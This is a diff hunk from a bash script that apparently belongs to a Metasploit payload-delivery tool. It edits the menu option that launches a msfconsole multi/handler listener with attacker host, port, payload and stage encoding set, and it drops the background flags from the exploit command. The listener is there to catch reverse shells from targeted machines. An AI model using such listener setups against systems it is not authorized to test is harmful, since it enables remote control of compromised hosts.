@@ -244,7 +244,7 @@ while true; do
    echo ""
    msf_list=$(zenity --list --title "+ DELIVER OPTIONS +" --text "Would you like to start a listener?" --radiolist --column "Choose" --column "Option" TRUE "Multi-Handler" FALSE "Main-Menu" FALSE "Exit" --width 305 --height 270 2> /dev/null) 
    case $msf_list in 
-   Multi-Handler) postgresql_start;xterm -T "DELIVER MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; set ExitOnSession false; set EnableStageEncoding true; exploit -j -z'";echo "";suite;;
+   Multi-Handler) postgresql_start;xterm -T "DELIVER MULTI/HANDLER" -fa monaco -fs 10 -bg black -e "msfconsole -x 'use multi/handler; set LHOST $LHOST; set LPORT $LPORT; set PAYLOAD $PAYLOAD; set ExitOnSession false; set EnableStageEncoding true; exploit'";echo "";suite;;
    Main-Menu) clear;main;;
    Exit) echo -e $yellow "";apache_svc_stop;postgresql_stop;echo " Good Bye !!";echo "";exit;;
    esac
